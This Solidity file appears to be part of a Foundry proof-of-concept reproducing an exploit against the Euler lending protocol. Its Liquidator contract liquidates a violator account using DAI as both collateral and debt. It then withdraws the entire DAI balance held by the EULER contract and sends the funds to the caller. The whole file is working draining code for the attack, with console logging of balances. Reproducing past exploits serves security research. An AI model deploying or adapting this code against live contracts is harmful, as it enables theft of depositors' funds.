// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import { IERC20 } from "forge-std/src/interfaces/IERC20.sol";
import { IEToken } from "./interface/IEToken.sol";
import { IDToken } from "./interface/IDToken.sol";
import { ILiquidation } from "./interface/ILiquidation.sol";
import { IMarkets } from "./interface/IMarkets.sol";

import "forge-std/src/Test.sol";

contract Liquidator {
    IERC20 immutable DAI;
    IEToken immutable eDAI;
    IDToken immutable dDAI;
    address immutable EULER;
    ILiquidation immutable LIQUIDATION;
    IMarkets immutable MARKETS;

    constructor(IERC20 _dai, IEToken _eDAI, IDToken _dDAI, address _euler, ILiquidation _liquidation, IMarkets _markets) {
        DAI = _dai;
        eDAI = _eDAI;
        dDAI = _dDAI;
        EULER = _euler;
        LIQUIDATION = _liquidation;
        MARKETS = _markets;
    }


    function liquidate(address violator) external {
        ILiquidation.LiquidationOpportunity memory returnData =
            LIQUIDATION.checkLiquidation(address(this), violator, address(DAI), address(DAI));
        MARKETS.getUserAsset("before liquidating", address(eDAI), address(this));
        LIQUIDATION.liquidate(violator, address(DAI), address(DAI), returnData.repay, returnData.yield);
        MARKETS.getUserAsset("after liquidating", address(eDAI), address(this));
        console.log("EULER balance before withdrawing: ", DAI.balanceOf(EULER));
        eDAI.withdraw(0, DAI.balanceOf(EULER));
        console.log("EULER balance after withdrawing: ", DAI.balanceOf(EULER));
        MARKETS.getUserAsset("after withdrawing", address(eDAI), address(this));
        DAI.transfer(msg.sender, DAI.balanceOf(address(this)));
    }
}